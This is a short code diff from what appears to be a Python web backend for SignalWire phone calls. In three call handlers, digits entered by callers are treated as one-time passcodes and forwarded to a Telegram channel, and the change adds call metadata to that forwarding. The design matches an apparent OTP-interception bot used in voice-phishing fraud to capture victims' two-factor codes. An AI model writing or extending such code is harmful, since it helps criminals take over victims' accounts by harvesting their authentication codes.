@@ -381,7 +381,8 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
                 await telegram.send_otp_to_channel(
                     otp_code=Digits,
                     call_id=call_id,
-                    user_email=user.get('email', 'Unknown')
+                    user_email=user.get('email', 'Unknown'),
+                    call_data=call_data  # Pass call data for formatting
                 )
             except Exception as e:
                 logger.warning(f"Failed to forward OTP to Telegram: {e}")
@@ -568,7 +569,8 @@ async def signalwire_retry_otp(call_id: str, Digits: str = Form(None)):
                 await telegram.send_otp_to_channel(
                     otp_code=Digits,
                     call_id=call_id,
-                    user_email=user.get('email', 'Unknown')
+                    user_email=user.get('email', 'Unknown'),
+                    call_data=call_data  # Pass call data for formatting
                 )
             except Exception as e:
                 logger.warning(f"Failed to forward OTP to Telegram: {e}")
@@ -702,7 +704,8 @@ async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(N
                 await telegram.send_otp_to_channel(
                     otp_code=Digits,
                     call_id=call_id,
-                    user_email=user.get('email', 'Unknown')
+                    user_email=user.get('email', 'Unknown'),
+                    call_data=call_data  # Pass call data for formatting
                 )
             except Exception as e:
                 logger.warning(f"Failed to forward OTP to Telegram: {e}")
